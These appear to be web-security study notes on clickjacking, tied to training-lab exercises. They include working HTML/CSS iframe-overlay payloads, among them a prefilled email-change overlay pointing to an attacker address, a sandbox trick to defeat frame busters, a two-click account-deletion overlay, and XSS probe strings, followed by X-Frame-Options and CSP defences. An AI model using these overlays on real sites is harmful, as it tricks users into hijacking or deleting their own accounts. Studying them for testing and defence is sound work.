# Clickjacking (UI Redressing)

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

The technique depends upon the invisible button or hidden link, say, within an iframe.

This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.

Protection against CSRF attacks is often provided by the use of a CSRF token: a session-specific, single-use number or nonce. Clickjacking attacks are not mitigated by the CSRF token.

## How to construct a basic clickjacking attack

{% code overflow="wrap" fullWidth="true" %}
```sh
# Clickjacking use CSS. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. 
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
The target website iframe is positioned within the browser so that there is a precise overlap of the target action
with the decoy website using appropriate width and height position values. 
Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy 
regardless of screen size, browser type and platform. 
The z-index determines the stacking order of the iframe and website layers. 
The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user.
# EXAMPLE: Basic clickjacking with CSRF token protection - Input this as the body to deliver to the victim
- Locate dangerous button/function on a website that will be triggered when clickjacking is performed on our attack web
- Use iframe <iframe src="URL"></iframe>
- Check iframe works and can be seen
- Place style code, div and iframe
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1; # our div is 1 so it is placed at the top of the iframe
    }
</style>
<div>CLICK ME</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
- Test with predefined big values of width, height and set opacity to 0.1 / try top/left to 100px to start
- Now move the CLICK ME div (top/left) until we perfectly align it to our dangerous button
```
{% endcode %}

## Clickbandit

When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead. This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay.

## Clickjacking with prefilled form input

Victim could be tricked to click a button that is sending GET parameters (data) via a transparent "submit" button. That info might be sent to the malicious website hosted by the attacker.

{% code overflow="wrap" fullWidth="true" %}
```sh
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
{% endcode %}

## Frame busting scripts

A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

* check and enforce that the current application window is the main or top window,
* make all frames visible,
* prevent clicking on invisible frames,
* intercept and flag potential clickjacking attacks to the user.

{% code overflow="wrap" fullWidth="true" %}
```sh
# An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. 
# When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted 
# then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window: 
# NOTE: mind the browser (Firefox, Chrome) to attack the victim. If victim is using Chrome, we use the same browser.
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
{% endcode %}

## Combining clickjacking with a DOM XSS attack

The true potency of clickjacking is revealed when it is used as a carrier for another attack such as a DOM XSS attack. First XSS exploit has to be identified, then XSS exploit is combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

{% code overflow="wrap" fullWidth="true" %}
```sh
# EXAMPLE
- Find a place where we can submit feedback, post comments, etc.
- Try XSS payloads such as <script>alert(1)</script> and <img
- Find that <img src=1 onerror=alert(1)> works on the name parameter of submit feedback
- Follow the same pattern as before to deliver clickjacking exploit on /feedback?name=...
```
{% endcode %}

## Multistep clickjacking

Attacker manipulation of inputs to a target website may necessitate multiple actions (implemented using multiple divisions or iframes). Such attacks require considerable precision and care from the attacker perspective to be effective and stealthy.

{% code overflow="wrap" fullWidth="true" %}
```sh
# EXAMPLE: confirmation dialog to protect against Clickjacking. 
# Construct an attack that fools the user into clicking the delete account button and the confirmation dialog 
# by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab. 
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position:absolute;
        top:495px;
        left:45px;
        z-index: 1;
    }
    .secondClick {
        top:295px;
        left:205px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0af70061041be73b8114acc0001e006d.web-security-academy.net/my-account"></iframe>
```
{% endcode %}

## How to prevent clickjacking attacks

{% code overflow="wrap" fullWidth="true" %}
```sh
#################### X-Frame-Options
# The header provides control over the use of iframesso that inclusion of a web page within a frame can be denied:
X-Frame-Options: deny
# Alternatively, framing can be restricted to the same origin as the website using the sameorigin directive
X-Frame-Options: sameorigin
# or to a named website using the allow-from directive:
X-Frame-Options: allow-from https://normal-website.com
# X-Frame-Options is not implemented consistently across browsers -> use it w/ CSP as multi-defense layer

#################### Content Security Policy (CSP)
# CSP is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking.
Content-Security-Policy: policy
# where policy is a string of policy directives separated by semicolons.
# Recommended clickjacking protection -> frame-ancestors directive (
Content-Security-Policy: frame-ancestors 'none'; # similar to deny on X-Frame-Options
# frame-ancestors 'self' directive is broadly equivalent to the X-Frame-Options sameorigin directive
Content-Security-Policy: frame-ancestors 'self'; # whitelists frames to the same domain only
# Alternatively, framing can be restricted to named sites:
Content-Security-Policy: frame-ancestors normal-website.com; 
```
{% endcode %}
